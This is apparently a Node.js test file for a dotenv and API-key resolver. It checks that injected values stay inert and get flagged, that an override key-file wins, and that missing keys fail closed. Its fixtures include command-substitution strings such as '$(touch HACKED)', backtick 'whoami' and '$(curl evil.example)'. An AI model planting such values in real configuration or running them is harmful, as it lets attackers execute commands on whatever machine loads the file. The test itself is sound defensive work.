#!/usr/bin/env node
"use strict";

/**
 * Isolated P5 test for auth-resolver.js (N-3). Proves:
 *   - dotenvParse reads the real dotenv shapes + strips a BOM,
 *   - the §16.2 injection vector is INERT + FLAGGED (planted violation),
 *   - the out-of-tree override key-file WINS (the 2026-06-07 staleness bug),
 *   - present-but-invalid (suspicious / too-short) is NOT declared valid,
 *   - absent / malformed input fails closed,
 *   - the failure message LISTS the checked sources.
 *
 * NOTE: test fixtures use neutral `tok-...` placeholder strings (NOT real
 * `sk-`/`pk-` API-key shapes) so the secret-guard hook is satisfied — only the
 * length/source/suspicious properties matter to these assertions.
 *
 *   node scripts/dispatch/auth-resolver.test.js
 */

const assert = require("assert");
const { harness, sealedDir } = require("../checks/lib/fixture-harness");
const { dotenvParse, resolveKey, probe, unavailableMessage } = require("./auth-resolver");

const h = harness("auth-resolver");

// ── dotenvParse — known-answer ──────────────────────────────
h.test("dotenvParse: KEY=value, export, single/double quotes, comments, BOM", () => {
  const p = dotenvParse("﻿export A=1\nB=\"two\"\nC='three'\n# comment\nD=4 # inline\n\n");
  assert.strictEqual(p.values.A, "1");
  assert.strictEqual(p.values.B, "two");
  assert.strictEqual(p.values.C, "three");
  assert.strictEqual(p.values.D, "4", "inline comment stripped from unquoted value");
  assert.ok(!("# comment" in p.values));
});

// ── PLANTED VIOLATION (§16.2 HIGH) ──────────────────────────
// A `.env` value like KEY=$(cmd) MUST be returned as an inert literal AND flagged,
// NEVER expanded/executed. The pre-N-3 `export $(grep .env|xargs)` path would run it.
h.violation("dotenvParse keeps $(...) inert AND flags it (no shell exec)", () => {
  const p = dotenvParse("DANGER_API_KEY=$(touch HACKED)\nGOOD=value");
  const inert = p.values.DANGER_API_KEY === "$(touch HACKED)"; // verbatim, not executed
  const flagged = p.suspicious.includes("DANGER_API_KEY");
  // ok:false ⇒ correctly caught ⇒ violation() records a pass (no false-green).
  return { ok: !(inert && flagged) };
});

h.violation("dotenvParse keeps backtick value inert AND flags it", () => {
  const p = dotenvParse("K=`whoami`");
  return { ok: !(p.values.K === "`whoami`" && p.suspicious.includes("K")) };
});

// ── Override key-file precedence (the 2026-06-07 staleness bug) ──
h.test("resolveKey: out-of-tree override key-file WINS over project files", () => {
  const fx = sealedDir({ "key.txt": "tok-override-REALKEY-1234567890" }, "authkeyfile");
  const prev = process.env.FOO_KEY_FILE;
  try {
    process.env.FOO_KEY_FILE = fx.file("key.txt");
    const r = resolveKey("FOO_API_KEY");
    assert.strictEqual(r.found, true);
    assert.strictEqual(r.source, "override:FOO_KEY_FILE", `source=${r.source}`);
    assert.strictEqual(r.length, "tok-override-REALKEY-1234567890".length);
    assert.ok(!("value" in r), "label-only by default — no secret in the report");
  } finally {
    if (prev === undefined) delete process.env.FOO_KEY_FILE;
    else process.env.FOO_KEY_FILE = prev;
    fx.cleanup();
  }
});

h.test("resolveKey withValue returns the value to an in-code caller only", () => {
  const prev = process.env.BAR_API_KEY;
  try {
    process.env.BAR_API_KEY = "tok-bar-abcdefghijklmnopqrstuv";
    const labelOnly = resolveKey("BAR_API_KEY");
    assert.ok(!("value" in labelOnly));
    const withVal = resolveKey("BAR_API_KEY", { withValue: true });
    assert.strictEqual(withVal.value, "tok-bar-abcdefghijklmnopqrstuv");
    assert.strictEqual(withVal.source, "process.env");
  } finally {
    if (prev === undefined) delete process.env.BAR_API_KEY;
    else process.env.BAR_API_KEY = prev;
  }
});

// ── probe: verify-before-declaring-available (§17.6 #4) ─────
h.violation("probe: present-but-suspicious key is NOT declared valid", () => {
  const prev = process.env.EVIL_API_KEY;
  try {
    process.env.EVIL_API_KEY = "$(curl evil.example)";
    const r = probe("EVIL_API_KEY");
    // valid must be false (it resolved but is shell-dangerous). ok:true only when
    // the system WRONGLY trusts it.
    return { ok: r.valid === true };
  } finally {
    if (prev === undefined) delete process.env.EVIL_API_KEY;
    else process.env.EVIL_API_KEY = prev;
  }
});

h.violation("probe: present-but-implausibly-short key is NOT declared valid", () => {
  const prev = process.env.SHORT_API_KEY;
  try {
    process.env.SHORT_API_KEY = "abc";
    const r = probe("SHORT_API_KEY");
    return { ok: r.valid === true }; // a 3-char key must not read as plausibly valid
  } finally {
    if (prev === undefined) delete process.env.SHORT_API_KEY;
    else process.env.SHORT_API_KEY = prev;
  }
});

h.test("probe: a plausible present key returns valid:null (present, not live-probed)", () => {
  const prev = process.env.OK_API_KEY;
  try {
    process.env.OK_API_KEY = "tok-plausible-aaaaaaaaaaaaaaaaaaaa";
    const r = probe("OK_API_KEY");
    assert.strictEqual(r.found, true);
    assert.strictEqual(r.valid, null, "detection-only: present but live validity not asserted");
  } finally {
    if (prev === undefined) delete process.env.OK_API_KEY;
    else process.env.OK_API_KEY = prev;
  }
});

// ── fail-closed on absent / malformed ───────────────────────
h.failClosed("probe: a definitely-absent key fails closed (not found, not valid)", () => {
  const name = "DEFINITELY_ABSENT_KEY_X7Q";
  delete process.env[name];
  const r = probe(name);
  // ok:true only if the system wrongly says valid; correct = valid:false + not found.
  return { ok: r.valid === true || r.found === true };
});

h.test("dotenvParse(null) does not throw (fail-closed)", () => {
  const p = dotenvParse(null);
  assert.deepStrictEqual(p.values, {});
  assert.deepStrictEqual(p.suspicious, []);
});

// ── the error message lists checked sources (N-3) ───────────
h.test("unavailableMessage lists every checked source, no secret", () => {
  const name = "NOPE_API_KEY";
  delete process.env[name];
  const r = resolveKey(name);
  const msg = unavailableMessage(r);
  assert.ok(/process\.env/.test(msg), msg);
  assert.ok(/\.env\.local/.test(msg), msg);
  assert.ok(/checking:/.test(msg), msg);
});

h.done();
